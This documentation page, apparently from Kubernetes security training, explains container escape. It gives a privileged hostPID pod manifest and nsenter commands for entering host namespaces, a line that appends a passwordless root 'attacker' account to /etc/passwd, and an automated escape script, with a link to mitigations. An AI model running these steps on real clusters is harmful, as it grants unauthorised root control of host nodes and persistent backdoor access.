---
sidebar_position: 8
title: "Container Escape"
description: "How an attacker can break out of a container and gain control over the host system in Kubernetes."
keywords: [kubernetes security, container escape, privileged container, docker breakout, host access, container security, pod security, namespace escape, kernel exploit, CKS]
---

# Container Escape

A **container escape** occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This leads to a full compromise of the node, potentially including root access, system tampering, and lateral movement across the cluster.

---

## Exploitation Steps

An attacker targets a misconfigured container with elevated privileges. The following pod manifest is a **prerequisite** for all container escape paths, as it grants the attacker access to sensitive host namespaces and kernel features.

### Deploy a Privileged Pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  hostPID: true
  containers:
    - image: busybox
      name: test
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        allowPrivilegeEscalation: true
        privileged: true
  restartPolicy: Always
```

```bash
kubectl apply -f test-pod.yaml
```

Once the privileged pod is running, the attacker proceeds using one of the following options.

---

### Option 1: Escape Using Manual Namespace Entry

#### 1. Check the Container Environment

Verify if the container has access to the host’s mount namespace:

```bash
ls -l /proc/1/ns/mnt
```

Inspect if the host filesystem is visible:

```bash
ls /proc/1/root
```

#### 2. Enter Host Namespaces with `nsenter`

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

Verify the escape by checking:

```bash
hostname
whoami
```

If the hostname matches the host and the user is `root`, the escape was successful.

#### 3. Create a Persistent Root User

```bash
echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd
grep attacker /etc/passwd
```

---

### Option 2: Run an Automated Escape Script

Instead of manually running commands, the attacker may use a single script to automate the escape and persistence steps:

```bash
#!/bin/sh

echo "[*] Checking if the container has access to the host's root filesystem..."
if [ ! -d "/proc/1/root" ]; then
    echo "[-] Cannot access /proc/1/root. Escape is not possible."
    exit 1
fi

echo "[+] Host root filesystem detected at /proc/1/root."
echo "[*] Attempting to enter the host's namespaces..."

exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c '
    echo "[+] Successfully entered host namespaces."
    echo "[*] Adding attacker user to /etc/passwd..."
    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
    grep attacker /etc/passwd
    echo "[*] Checking system state..."
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
    ps aux | grep kubelet
    exec /bin/sh
'
```

---

### Result

The attacker achieves **interactive root access on the host node**. This breaks the container isolation model and enables full control over the host, including the ability to persist, modify system configurations, and pivot to other parts of the cluster.

---

## Mitigation

➡ [Preventing Container Escape](/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation)
